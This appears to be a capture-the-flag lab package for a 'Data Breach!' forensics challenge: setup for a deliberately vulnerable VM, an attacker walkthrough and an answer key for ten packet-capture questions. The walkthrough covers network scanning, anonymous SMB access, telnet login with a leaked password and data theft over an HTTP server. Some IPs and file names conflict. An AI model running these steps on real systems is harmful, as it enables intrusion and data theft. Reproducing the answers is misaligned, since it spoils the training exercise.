# Setup

## Setting up vunerable machine

### Spinning up a metasploitable vm
https://docs.rapid7.com/metasploit/metasploitable-2/

### Creating user on vulnerable machine
sudo useradd -m bob
sudo passwd bob
ilovecookies

### Creating files for exfil
su bob
cd ~
mkdir Documents
mkdir Desktop
touch Documents/importantnote.txt
touch Desktop/financialdata.txt

### importantnote.txt
Dear me,

just in case I ever forget, here is my password: ilovecookies

     - Bob

### financialdata.csv
Account Name, Account Number, Routing Number
Alpha, 9982777635, 00125839094
Bravo, 9982739029, 00125834324
Charlie, 9982719203, 00125836594

## Pentest walkthrough for PCAP capture

### Scan Port range for active hosts
sudo nmap -sn 192.168.45.0/24

### Scan host quickly for open ports
sudo nmap -F 192.168.45.12 
sudo nmap -F 192.168.45.13  

### Get smb shares as anonymous
smbclient -L //192.168.45.12 -N

### Access tmp directory and exfill password file
smbclient //192.168.45.12/files -N
ls
get importantnote.txt
exit

### Telnet onto target
telnet 192.168.45.12
bob
ilovecookes

bob
ilovecookies

ls
cd Desktop
ls

### Create http server to exfil data (on target system)
python -m SimpleHTTPServer 4444

### Exfil financial data (From attacker machine)
wget http://192.168.45.12:4444/financial_data.csv

# Solution:

## Data Breach! Part 1
- Question: What reconnassiance technique is seen in the packet capture? (Provide MITRE T#)
- Answer: T1595
- Walkthrough:
Open packet capture in wireshark. Immediately you can see evidence of network scanning

### Data Breach! Part 2
- Question: What is the ip address of the host performing the scanning? (x.x.x.x)
- Answer: 192.168.0.160
- Walkthrough: 
Looking through the scanning packets, we find the IP address by looking at what IP is sending the ICMP request

### Data Breach! Part 3
- Question: What hosts did the scan uncover in the scanned subnet? (Comma seperated list of IPs)
- Answer: 192.168.0.12, 192.168.0.13
- Walkthrough:
Looking through the scanning packets, we can see that the hosts that were active sent back ICMP replies. 

### Data Breach! Part 4
- Question: According to the port scanning on 192.168.45.12, what is the highest open port?
Answer: 6000
- Walkthrough:
Use the filter "ip.src == 192.168.45.12" to identify what scanning was responded to with a [SYN, ACK] and not a [RST, ACK]. Identify what port is the highest among the port scanning.

### Data Breach! Part 5
- Question: What service did the attacker zero in on and start enumerating immediately following the port scanning?
- Answer: SMB

### Data Breach! Part 6
- Question: What SMB share did the attacker access?
- Answer: Files

### Data Breach! Part 7
- Question: What was the password in the file that was exfiltrated?
- Answer: ilovecookies

### Data Breach! Part 8
- Question: When the attacker first tried login into the victem via telnet, he mistyped the password. Provide the mistyped password they entered
- Answer: ilovecookes

### Data Breach! Part 9
- Question: After logging in via TCP, what protocol did the attacker use to exfil data and on what port? (ex: dns, 53)
- Answer: http, 4444

### Data Breach! Part 10
- Question: What is the first "Routing Number" listed in the exfilled file?
- Answer: 00125839094
- Walkthrough: 










